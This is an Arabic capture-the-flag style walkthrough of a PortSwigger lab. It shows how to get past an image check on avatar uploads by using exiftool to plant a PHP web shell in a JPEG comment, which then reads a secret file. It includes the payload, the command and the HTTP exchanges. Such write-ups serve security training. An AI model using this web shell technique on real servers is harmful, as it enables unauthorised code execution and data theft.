# [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب.
ولكن سنلاحظ وجود رسالة خطأ في المتصفح والاستجابة
```http
HTTP/2 403 Forbidden
Date: Tue, 29 Sep 2026 19:51:20 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 164

Error: file is not a valid image
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
وحتى لو حاولنا تغيير اسم الملف إلى `TESTTEST.php.jpg` أو `TESTTEST.jpg` سنجد نفس الرسالة وهذا يعنى أن اللاب يتحقق فعليًا إذا كانت صورة حقيقة أو لا.

لذلكل سنقوم بإستعمال أداة **[`ExifTool`](https://github.com/exiftool/exiftool)**
ثم سنقوم بحقنها بهذا الأمر 
```Shell
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" TESTTEST.jpg -o TESTTEST.php
```
بعد ذلك سنقوم برفع الملف الناتج بإسم `TESTTEST.php` باستخدام خاصية رفع الـ `Avatar` داخل اللاب
وبمجرد اتمام الرفع وعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
GET /files/avatars/TESTTEST.php HTTP/2
Host: 0a9e002c03ebc6eb837e1adf00f800b2.web-security-academy.net
Cookie: session=NpQrZu2sckrSOggAwVltaaBlWMcwgFqQ
```
وبفحص الاستجابة سنجد بداخلها الـ `Secret` المطلوب والذي بين كلمتي `START` و `END` الذي تم حقنهم في الكود ليتم طباعتهم قبل وبعد محتويات ملف `/home/carlos/secret`
```http
HTTP/2 200 OK
Date: Tue, 29 Sep 2026 19:51:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 28258

START hZqOxiLQ39TmgGABiAMemXH4bvn0veCc END
```
بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Remote code execution via web shell upload](./Remote-code-execution-via-web-shell-upload.md)
